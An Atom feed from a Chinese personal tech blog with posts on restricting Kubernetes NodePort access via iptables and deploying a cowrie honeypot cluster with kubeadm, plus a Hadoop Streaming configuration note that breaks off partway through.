<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>woodpile27</title>
  
  
  <link href="http://woodpile27.cn/atom.xml" rel="self"/>
  
  <link href="http://woodpile27.cn/"/>
  <updated>2020-12-22T08:44:47.112Z</updated>
  <id>http://woodpile27.cn/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用 iptables 限制 Kubernetes 的 NodePort 服务</title>
    <link href="http://woodpile27.cn/2020/12/22/use-iptables-to-limit-kubernektes-nodeport-service/"/>
    <id>http://woodpile27.cn/2020/12/22/use-iptables-to-limit-kubernektes-nodeport-service/</id>
    <published>2020-12-22T00:00:00.000Z</published>
    <updated>2020-12-22T08:44:47.112Z</updated>
    
    <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在搭建了 Kubernetes 集群后，在 master 节点上部署了 Dashboard。我们希望在办公网内访问它，修改 service 端口暴露为 NodePort模式，则可以访问它。由于 master 节点部署在公网，我们希望对 NodePort 暴露的端口做限制，换句话说，只允许办公网内的 ip 对其进行访问。开始以为会很简单，用 iptables 在 INPUT 链上加一个 DROP 和 ACCEPT 操作就可以了，但事实上并非如此。</p><h3 id="NodePort"><a href="#NodePort" class="headerlink" title="NodePort"></a>NodePort</h3><p>查看 kubernetes-dashboard 命名空间里的 service，kubernetes 创建了一个名为 kubernetes-dashboard 的 NodePort，在主机端口上监听50000端口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~# kubectl get svc --namespace&#x3D;kubernetes-dashboard</span><br><span class="line">NAME                        TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)         AGE</span><br><span class="line">dashboard-metrics-scraper   ClusterIP   10.110.216.172   &lt;none&gt;        8000&#x2F;TCP        18h</span><br><span class="line">kubernetes-dashboard        NodePort    10.97.249.27     &lt;none&gt;        443:50000&#x2F;TCP   18h</span><br></pre></td></tr></table></figure><p>只要我们访问 MASTER-IP:50000 就可以进入 Dashboard，是在 iptables 里经历了很多条规则才到达的。</p><ol><li><p>经过 PREROUTING 进入 KUBE-SERVICES。由于 nat 在 filter 之前，所以在 INPUT 链做限制不会起作用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Chain PREROUTING (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">KUBE-SERVICES  all  --  anywhere             anywhere             &#x2F;* kubernetes service portals *&#x2F;</span><br></pre></td></tr></table></figure><p>对应的 iptables 规则（ iptables-save 可查看）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A OUTPUT -m comment --comment &quot;kubernetes service portals&quot; -j KUBE-SERVICES</span><br></pre></td></tr></table></figure></li><li><p>经过 KUBE-SERVICES 进入 KUBE-NODEPORTS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chain KUBE-SERVICES (2 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">......</span><br><span class="line">KUBE-NODEPORTS  all  --  anywhere             anywhere             &#x2F;* kubernetes service nodeports; NOTE: this must be the last rule in this chain *&#x2F; ADDRTYPE match dst-type LOCAL</span><br></pre></td></tr></table></figure><p>对应的 iptables 规则，可以看到其会是链里的最后一条规则，只有当上边的所有服务规则都不匹配时才会进入 NODEPORTS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A KUBE-SERVICES -m comment --comment &quot;kubernetes service nodeports; NOTE: this must be the last rule in this chain&quot; -m addrtype --dst-type LOCAL -j KUBE-NODEPORTS</span><br></pre></td></tr></table></figure></li><li><p>经过 KUBE-NODEPORTS 后，首先经过 KUBE-MARK-MASQ 打上标签，之后进入 KUBE-SVC-CEZPIJSAUFW5MYPQ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chain KUBE-NODEPORTS (1 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">KUBE-MARK-MASQ  tcp  --  anywhere             anywhere             &#x2F;* kubernetes-dashboard&#x2F;kubernetes-dashboard *&#x2F; tcp dpt:50000</span><br><span class="line">KUBE-SVC-CEZPIJSAUFW5MYPQ  tcp  --  anywhere             anywhere             &#x2F;* kubernetes-dashboard&#x2F;kubernetes-dashboard *&#x2F; tcp dpt:50000</span><br></pre></td></tr></table></figure><p>对应的 iptables 规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> -A KUBE-NODEPORTS -p tcp -m comment --comment &quot;kubernetes-dashboard&#x2F;kubernetes-dashboard&quot; -m tcp --dport 50000 -j KUBE-MARK-MASQ</span><br><span class="line">-A KUBE-NODEPORTS -p tcp -m comment --comment &quot;kubernetes-dashboard&#x2F;kubernetes-dashboard&quot; -m tcp --dport 50000 -j KUBE-SVC-CEZPIJSAUFW5MYPQ</span><br></pre></td></tr></table></figure></li><li><p>经过 KUBE-SVC-CEZPIJSAUFW5MYPQ 进入 KUBE-SEP-QXJL632FHGWBBYEF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Chain KUBE-SVC-CEZPIJSAUFW5MYPQ (2 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">KUBE-SEP-QXJL632FHGWBBYEF  all  --  anywhere             anywhere             &#x2F;* kubernetes-dashboard&#x2F;kubernetes-dashboard *&#x2F;</span><br></pre></td></tr></table></figure><p>对应的 iptables 规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A KUBE-SVC-CEZPIJSAUFW5MYPQ -m comment --comment &quot;kubernetes-dashboard&#x2F;kubernetes-dashboard&quot; -j KUBE-SEP-QXJL632FHGWBBYEF</span><br></pre></td></tr></table></figure></li><li><p>经过 KUBE-SEP-QXJL632FHGWBBYEF 的 DNAT 操作转给了 10.244.0.12。正是 kubernetes-dashboard pods 的 IP。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chain KUBE-SEP-QXJL632FHGWBBYEF (1 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">KUBE-MARK-MASQ  all  --  10.244.0.12          anywhere             &#x2F;* kubernetes-dashboard&#x2F;kubernetes-dashboard *&#x2F;</span><br><span class="line">DNAT       tcp  --  anywhere             anywhere             &#x2F;* kubernetes-dashboard&#x2F;kubernetes-dashboard *&#x2F; tcp to:10.244.0.12:8443</span><br></pre></td></tr></table></figure><p>对应的 iptables 规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-A KUBE-SEP-QXJL632FHGWBBYEF -s 10.244.0.12&#x2F;32 -m comment --comment &quot;kubernetes-dashboard&#x2F;kubernetes-dashboard&quot; -j KUBE-MARK-MASQ</span><br><span class="line">-A KUBE-SEP-QXJL632FHGWBBYEF -p tcp -m comment --comment &quot;kubernetes-dashboard&#x2F;kubernetes-dashboard&quot; -m tcp -j DNAT --to-destination 10.244.0.12:8443</span><br></pre></td></tr></table></figure></li></ol><h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><p>在知道了原理后，再要解决我们的问题就很容易了，方式其实也有很多种，我直接选择了最粗暴的，那就是在 PREROUTING 中加入一条规则，将不属于公司办公网 sip 的请求直接 DNAT 到65535，一个没有运行任何服务的端口。就解决了问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -I PREROUTING -p tcp ! -s x.x.x.x&#x2F;30 --dport 50000 -j REDIRECT --to-ports 65535</span><br></pre></td></tr></table></figure><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://juejin.cn/post/6844904098605563912">https://juejin.cn/post/6844904098605563912</a><br><a href="https://zhaohuabing.com/istio-practice/content/ingress/nodeport.html">https://zhaohuabing.com/istio-practice/content/ingress/nodeport.html</a><br><a href="https://www.jianshu.com/p/c6d560d12d50">https://www.jianshu.com/p/c6d560d12d50</a><br><a href="https://developer.aliyun.com/article/745086">https://developer.aliyun.com/article/745086</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h3&gt;&lt;p&gt;在搭建了 Kubernetes 集群后，在 master 节点上部署了 Dashboard。我们希望在办公网内访问它，修改 service </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>使用 kubernetes 部署分布式蜜罐系统的实践</title>
    <link href="http://woodpile27.cn/2020/12/20/k8s-honeypot/"/>
    <id>http://woodpile27.cn/2020/12/20/k8s-honeypot/</id>
    <published>2020-12-20T00:00:00.000Z</published>
    <updated>2020-12-20T07:57:19.572Z</updated>
    
    <content type="html"><![CDATA[<h3 id="搭建集群"><a href="#搭建集群" class="headerlink" title="搭建集群"></a>搭建集群</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>按照 kubernetes 官方文档中安装 kubeadm 的<a href="https://kubernetes.io/zh/docs/setup/production-environment/tools/kubeadm/install-kubeadm/">部分</a>进行安装</p><ul><li>禁用 swap 分区<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swapoff -a</span><br></pre></td></tr></table></figure></li><li>把 iptables 工具切换到“旧版”模式，按照文档的说明，在较新的 Linux 发行版本中，iptables 工具使用 nftables 后端，其与 kubeadm 不兼容。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --set iptables &#x2F;usr&#x2F;sbin&#x2F;iptables-legacy</span><br><span class="line">update-alternatives --set ip6tables &#x2F;usr&#x2F;sbin&#x2F;ip6tables-legacy</span><br><span class="line">update-alternatives --set arptables &#x2F;usr&#x2F;sbin&#x2F;arptables-legacy</span><br><span class="line">update-alternatives --set ebtables &#x2F;usr&#x2F;sbin&#x2F;ebtables-legacy</span><br></pre></td></tr></table></figure></li><li>安装 docker ：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install docker.io</span><br></pre></td></tr></table></figure></li><li>安装 kubeadm、kubelet 和 kubectl（国外）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install -y apt-transport-https curl</span><br><span class="line">curl -s https:&#x2F;&#x2F;packages.cloud.google.com&#x2F;apt&#x2F;doc&#x2F;apt-key.gpg | sudo apt-key add -</span><br><span class="line">cat &lt;&lt;EOF | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;kubernetes.list</span><br><span class="line">deb https:&#x2F;&#x2F;apt.kubernetes.io&#x2F; kubernetes-xenial main</span><br><span class="line">EOF</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y kubelet kubeadm kubectl</span><br><span class="line">sudo apt-mark hold kubelet kubeadm kubectl</span><br></pre></td></tr></table></figure></li><li>安装 kubeadm、kubelet 和 kubectl（国内）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> sudo apt-get update &amp;&amp; sudo apt-get install -y apt-transport-https curl</span><br><span class="line"> curl -s https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kubernetes&#x2F;apt&#x2F;doc&#x2F;apt-key.gpg | sudo apt-key add -</span><br><span class="line"> cat &lt;&lt;EOF &gt; &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;kubernetes.list</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kubernetes&#x2F;apt kubernetes-xenial main</span><br><span class="line">EOF</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y kubelet kubeadm kubectl</span><br><span class="line">&#x2F;&#x2F; 下载镜像（worker节点）</span><br><span class="line">kubeadm config images list</span><br><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com&#x2F;google_containers&#x2F;kube-proxy:v1.20.1</span><br><span class="line">docker tag registry.cn-hangzhou.aliyuncs.com&#x2F;google_containers&#x2F;kube-proxy:v1.20.1 k8s.gcr.io&#x2F;kube-proxy:v1.20.1</span><br><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com&#x2F;google_containers&#x2F;pause:3.2</span><br><span class="line">docker tag registry.cn-hangzhou.aliyuncs.com&#x2F;google_containers&#x2F;pause:3.2 k8s.gcr.io&#x2F;pause:3.2</span><br><span class="line">docker pull quay.io&#x2F;coreos&#x2F;flannel:v0.13.1-rc1</span><br></pre></td></tr></table></figure></li></ul><h4 id="Master-节点"><a href="#Master-节点" class="headerlink" title="Master 节点"></a>Master 节点</h4><p>Master 节点我选用了一台已有的 vps 机器中配置最高的，4核8G内存。</p><ul><li>初始化 Master 节点<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubeadm init --pod-network-cidr&#x3D;10.244.0.0&#x2F;16 \</span><br><span class="line">    --apiserver-cert-extra-sans $&#123;MASTER_PUBIP&#125; \</span><br><span class="line">    --apiserver-advertise-address $&#123;MASTER_PUBIP&#125;  \</span><br><span class="line">    --node-name master01</span><br></pre></td></tr></table></figure></li><li>-pod-network-cidr：指定 pod 网络的 IP 地址范围</li><li>-apiserver-advertise-address：    API 服务器所公布的其正在监听的 IP 地址。使用 Master 节点的公网 ip 地址，在 linode 上可以运行，在一些云服务商上如果公网 ip 没有绑定到网卡上时会无法启动 ETCD</li><li>-apiserver-cert-extra-sans：用于 API Server 服务证书的可选附加主题备用名称（SAN）</li><li>-node-name：节点的 name</li><li>运行 kubectl（root 用户）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KUBECONFIG&#x3D;&#x2F;etc&#x2F;kubernetes&#x2F;admin.conf</span><br></pre></td></tr></table></figure></li><li>安装 Pod 网络附加组件 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;coreos&#x2F;flannel&#x2F;master&#x2F;Documentation&#x2F;kube-flannel.yml</span><br></pre></td></tr></table></figure></li></ul><h4 id="Worker-节点"><a href="#Worker-节点" class="headerlink" title="Worker 节点"></a>Worker 节点</h4><p>Worker 节点上运行蜜罐容器。配置：1核1G内存。跟官方文档推荐的配置有点差距，但也够用了</p><ul><li>加入节点<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubeadm join $&#123;MASTER_PUBIP&#125;:6443 --token $&#123;TOKEN&#125; \</span><br><span class="line">   --discovery-token-ca-cert-hash sha256:$&#123;HASH&#125;</span><br></pre></td></tr></table></figure></li><li>给工作节点打上标签 type=worker 和位置标签 loc=cn or foreign<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl label nodes $&#123;NODE_NAME&#125; type&#x3D;worker</span><br><span class="line">kubectl label nodes $&#123;NODE_NAME&#125; loc&#x3D;foreign</span><br></pre></td></tr></table></figure></li></ul><h3 id="配置信息"><a href="#配置信息" class="headerlink" title="配置信息"></a>配置信息</h3><p>蜜罐容器需要读取配置文件，我创建了三种配置文件：</p><ul><li>私有镜像仓库密钥，敏感数据，使用 Secret</li><li>蜜罐的配置文件，包含数据管道的地址和验证信息，敏感数据，使用 Secret</li><li>cowrie 的配置文件，非敏感数据，使用 ConfigMap</li></ul><h4 id="创建用于私有镜像仓库鉴权的-Secret"><a href="#创建用于私有镜像仓库鉴权的-Secret" class="headerlink" title="创建用于私有镜像仓库鉴权的 Secret"></a>创建用于私有镜像仓库鉴权的 Secret</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create secret docker-registry dockerhubsecret --docker-username&#x3D;$&#123;USERNAME&#125;  --docker-password&#x3D;$&#123;PASSWORD&#125;</span><br></pre></td></tr></table></figure><h4 id="创建蜜罐配置文件的-Secret"><a href="#创建蜜罐配置文件的-Secret" class="headerlink" title="创建蜜罐配置文件的 Secret"></a>创建蜜罐配置文件的 Secret</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create secret generic honeypot-config --from-file&#x3D;config&#x2F;config.toml</span><br></pre></td></tr></table></figure><h4 id="创建-cowrie-配置文件的-ConfigMap"><a href="#创建-cowrie-配置文件的-ConfigMap" class="headerlink" title="创建 cowrie 配置文件的 ConfigMap"></a>创建 cowrie 配置文件的 ConfigMap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create configmap cowrie-config --from-file&#x3D;etc&#x2F;</span><br></pre></td></tr></table></figure><h4 id="创建-ServiceAccount"><a href="#创建-ServiceAccount" class="headerlink" title="创建 ServiceAccount"></a>创建 ServiceAccount</h4><p>向 ServiceAccount 中添加镜像拉取密钥可以不必为每个 pod 都单独进行镜像拉取密钥的添加操作</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">sa</span></span><br><span class="line"><span class="attr">imagePullSecrets:</span></span><br><span class="line"><span class="string">-name:</span> <span class="string">dockerhubsecret</span></span><br></pre></td></tr></table></figure><h3 id="创建-Deployment"><a href="#创建-Deployment" class="headerlink" title="创建 Deployment"></a>创建 Deployment</h3><p>因为 GFW 的存在，在国内和国外部署的蜜罐需要使用不同的数据管道，也就需要使用不同的 ConfigMap。在国内和国外我们创建了两个 Deployment。每个 pod 包含两个容器，分别是我们的蜜罐和 cowrie。</p><ul><li>升级策略：<code>spec.strategy</code> 使用了 Recreate，即在升级时一次性删除所有旧版本的pod后再创建新pod</li><li>节点选择器：<code>spec.template.spec.nodeSelector</code> 选择之前设置的 type 标签选择 worker 节点。根据不同的地址位置选择 loc 标签</li><li>非亲缘性：<code>spec.template.spec.affinity</code> 定义 podAntiAffinity 强制 pod 调度到不同的节点上。</li><li>赋值 ServiceAccount：<code>spec.template.spec.serviceAccountName</code></li><li>使用宿主节点的网络空间：<code>spec.template.spec.hostNetwork</code></li><li>使用特权模式运行pod：<code>spec.template.spec.containers.securityContext</code></li><li>挂载配置文件：<code>spec.template.spec.containers.volumeMounts</code></li><li>存活指针：<code>spec.template.spec.containers.livenessProbe</code></li></ul><p>完整的配置文件放在了最后。</p><h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><ul><li>在部署工作节点时，如果节点的公网 IP 没有绑定到网卡上，需要在 Master 上设置 iptables 规则，将内网 IP 转向外网 IP。<a href="https://www.jianshu.com/p/897e0f14be60">参考</a></li><li>当前的集群配置比较初级，后续还有很大的改进空间。</li><li>《Kubernetes in Action》真的很不错。</li></ul><h3 id="honeypot-deployment-cn-yaml"><a href="#honeypot-deployment-cn-yaml" class="headerlink" title="honeypot-deployment-cn.yaml"></a>honeypot-deployment-cn.yaml</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">honeypot-cn</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">strategy:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">Recreate</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">honeypot</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">honeypot</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">nodeSelector:</span></span><br><span class="line">        <span class="attr">type:</span> <span class="string">&quot;worker&quot;</span></span><br><span class="line">        <span class="attr">loc:</span> <span class="string">&quot;cn&quot;</span></span><br><span class="line">      <span class="attr">affinity:</span></span><br><span class="line">        <span class="attr">podAntiAffinity:</span></span><br><span class="line">          <span class="attr">requiredDuringSchedulingIgnoredDuringExecution:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">topologyKey:</span> <span class="string">kubernetes.io/hostname</span></span><br><span class="line">            <span class="attr">labelSelector:</span></span><br><span class="line">              <span class="attr">matchLabels:</span></span><br><span class="line">                <span class="attr">app:</span> <span class="string">honeypot</span></span><br><span class="line">      <span class="attr">serviceAccountName:</span> <span class="string">sa</span></span><br><span class="line">      <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">xxxxx/xxxxxx</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">honeypot-config</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/config/</span></span><br><span class="line">        <span class="attr">securityContext:</span></span><br><span class="line">          <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">livenessProbe:</span></span><br><span class="line">          <span class="attr">tcpSocket:</span></span><br><span class="line">            <span class="attr">port:</span> <span class="string">xxx</span></span><br><span class="line">          <span class="attr">initialDelaySeconds:</span> <span class="number">20</span></span><br><span class="line">          <span class="attr">timeoutSeconds:</span> <span class="number">5</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">600</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">cowrie/cowrie</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">cowrie</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">cowrie-config</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/cowrie/cowrie-git/etc</span></span><br><span class="line">        <span class="attr">livenessProbe:</span></span><br><span class="line">          <span class="attr">tcpSocket:</span></span><br><span class="line">            <span class="attr">port:</span> <span class="string">xxx</span></span><br><span class="line">          <span class="attr">initialDelaySeconds:</span> <span class="number">20</span></span><br><span class="line">          <span class="attr">timeoutSeconds:</span> <span class="number">5</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">10</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">honeypot-config</span></span><br><span class="line">        <span class="attr">secret:</span></span><br><span class="line">          <span class="attr">secretName:</span> <span class="string">honeypot-config</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">cowrie-config</span></span><br><span class="line">        <span class="attr">configMap:</span></span><br><span class="line">          <span class="attr">name:</span> <span class="string">cowrie-config</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;搭建集群&quot;&gt;&lt;a href=&quot;#搭建集群&quot; class=&quot;headerlink&quot; title=&quot;搭建集群&quot;&gt;&lt;/a&gt;搭建集群&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hadoop Sreaming Note</title>
    <link href="http://woodpile27.cn/2020/10/06/hadoop-steaming-note/"/>
    <id>http://woodpile27.cn/2020/10/06/hadoop-steaming-note/</id>
    <published>2020-10-06T00:00:00.000Z</published>
    <updated>2020-10-16T04:34:32.169Z</updated>
    
    <content type="html"><![CDATA[<h3 id="配置参数"><a href="#配置参数" class="headerlink" title="配置参数"></a>配置参数</h3><ul><li><strong>mapreduce.job.name</strong>：job name。</li><li><strong>mapreduce.job.priority</strong>：优先级调度，只是在计算任务向集群服务申请资源的时候会起作用。</li><li><strong>mapreduce.job.running.map.limit</strong>：每个作业最多可以同时跑多少个map，默认是0，当值为0或负数时无限制。</li><li><strong>mapreduce.job.reduces</strong>：reduce任务个数，默认是1。</li><li><strong>mapred.input.dir.error.pass</strong>：跳过输入路径错误。</li><li><strong>mapred.split.zero.file.skip</strong>：如果文件长度为0则划分split。</li></ul><h4 id="容错"><a href="#容错" class="headerlink" title="容错"></a>容错</h4><ul><li><strong>mapreduce.map.maxattempts</strong>：每个map任务最大重试次数，重试次数超过该值则认为任务运行失败。默认是4。</li><li><strong>mapreduce.reduce.maxattempts</strong>：每个reduce任务最大重试次数，同上。  </li><li><strong>mapreduce.task.timeout</strong>：Task超时时间。如果一个任务在一定时间内不读取新的数据，也没有输出数据，则认为其处于block状态。为了防止用户程序永远block住不退出，强制设置了一个超时时间（单位毫秒），默认是300000。</li></ul><h4 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h4><ul><li><strong>mapreduce.map.output.compress</strong>：在通过网络发送之前map的输出是否压缩。默认false。</li><li><strong>mapreduce.map.output.compress.codec</strong>：指定map输出所用的压缩codec。</li></ul><p>对map输出进行数据压缩可以加速网络传输，对reduce输出进行数据压缩可以减少磁盘空间，如果输入文件是压缩的,那么在根据文件扩展名推断出相应的codec后，MapReduce会在读取文件是自动解压缩文件。</p><h4 id="效率和稳定性"><a href="#效率和稳定性" class="headerlink" title="效率和稳定性"></a>效率和稳定性</h4><ul><li><strong>mapreduce.map.speculative</strong>：map开启推测执行。默认true。</li><li><strong>mapreduce.reduce.speculative</strong>：reduce开启推测执行。默认true。</li></ul><p>在作业执行时，由于一些原因，比如硬件老化、软件层面的不恰当配置等。某些机器上的任务实例执行的很慢，拖慢了整个作业的进度。Hadoop不会尝试去诊断或者修复这些慢任务，相反它会在集群的其他节点上去启动这些慢任务的多个示例作为备份，这就是hadoop的推测执行（speculative execution）。</p><h3 id="map数量如何确定"><a href="#map数量如何确定" class="headerlink" 